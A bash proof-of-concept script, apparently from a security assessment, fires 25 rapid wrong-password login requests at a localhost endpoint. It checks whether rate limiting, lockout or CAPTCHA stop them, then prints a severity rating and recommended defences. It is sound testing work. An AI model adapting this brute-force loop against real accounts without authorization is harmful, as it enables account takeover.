#!/bin/bash

# POC: Missing Rate Limiting on Password Authentication
# This script demonstrates that the application allows unlimited password guessing attempts
# without implementing any rate limiting, throttling, or account lockout mechanisms

TARGET_URL="http://localhost:8082/password/test"
USERNAME="test"
USER_ID="10032"
ATTEMPTS=25

echo "============================================"
echo "POC: Missing Rate Limiting on Authentication"
echo "============================================"
echo ""
echo "Target: $TARGET_URL"
echo "Username: $USERNAME"
echo "Test: Performing $ATTEMPTS rapid failed login attempts"
echo ""

# Track results
successful_attempts=0
failed_attempts=0
lockout_detected=false
rate_limit_detected=false

echo "Starting brute force simulation..."
echo ""

start_time=$(date +%s)

for i in $(seq 1 $ATTEMPTS); do
    echo -n "Attempt $i/$ATTEMPTS: "
    
    # Record start time for this request
    request_start=$(date +%s.%N)
    
    # Perform login attempt with wrong password
    response=$(curl -s -w "\n%{http_code}\n%{time_total}" -X POST \
        -d "username=$USERNAME&user_id=$USER_ID&password=wrongpassword$i" \
        -L "$TARGET_URL" 2>&1)
    
    # Extract HTTP code and time from response
    http_code=$(echo "$response" | tail -n 2 | head -n 1)
    time_total=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | head -n -2)
    
    # Check for rate limiting indicators
    if echo "$body" | grep -qi "too many\|rate limit\|slow down\|throttle"; then
        echo "RATE LIMIT DETECTED!"
        rate_limit_detected=true
        break
    fi
    
    # Check for account lockout indicators
    if echo "$body" | grep -qi "locked\|blocked\|suspended\|disabled"; then
        echo "ACCOUNT LOCKOUT DETECTED!"
        lockout_detected=true
        break
    fi
    
    # Check for CAPTCHA
    if echo "$body" | grep -qi "captcha\|recaptcha"; then
        echo "CAPTCHA DETECTED!"
        rate_limit_detected=true
        break
    fi
    
    # Check response
    if [ "$http_code" = "302" ] || [ "$http_code" = "200" ]; then
        if echo "$body" | grep -qi "incorrect password\|wrong password\|invalid"; then
            echo "Failed (HTTP $http_code) - Response time: ${time_total}s"
            ((failed_attempts++))
        else
            echo "Unexpected response (HTTP $http_code)"
            ((successful_attempts++))
        fi
    else
        echo "HTTP $http_code (time: ${time_total}s)"
        ((failed_attempts++))
    fi
    
    # Small delay to avoid overwhelming the server (not part of the app's protection)
    sleep 0.1
done

end_time=$(date +%s)
total_time=$((end_time - start_time))

echo ""
echo "============================================"
echo "RESULTS"
echo "============================================"
echo "Total attempts made: $failed_attempts"
echo "Time elapsed: ${total_time}s"
echo "Average rate: $(echo "scale=2; $failed_attempts / $total_time" | bc) attempts/second"
echo ""

if [ "$rate_limit_detected" = true ]; then
    echo "STATUS: ✓ Rate limiting IS implemented"
    echo "SEVERITY: INFORMATIONAL - Protection working as expected"
    exit 1
elif [ "$lockout_detected" = true ]; then
    echo "STATUS: ✓ Account lockout IS implemented"
    echo "SEVERITY: INFORMATIONAL - Protection working as expected"
    exit 1
else
    echo "STATUS: ✗ VULNERABLE - No rate limiting or account lockout detected"
    echo "SEVERITY: HIGH"
    echo ""
    echo "IMPACT:"
    echo "- Unlimited password guessing attempts possible"
    echo "- No throttling or delays implemented"
    echo "- No account lockout after $failed_attempts failed attempts"
    echo "- Brute force attacks can proceed at high speed"
    echo ""
    echo "RECOMMENDATION:"
    echo "- Implement progressive rate limiting after 3-5 failed attempts"
    echo "- Add account lockout mechanism after 5-10 failed attempts"
    echo "- Implement CAPTCHA after multiple failures"
    echo "- Add IP-based rate limiting"
    exit 0
fi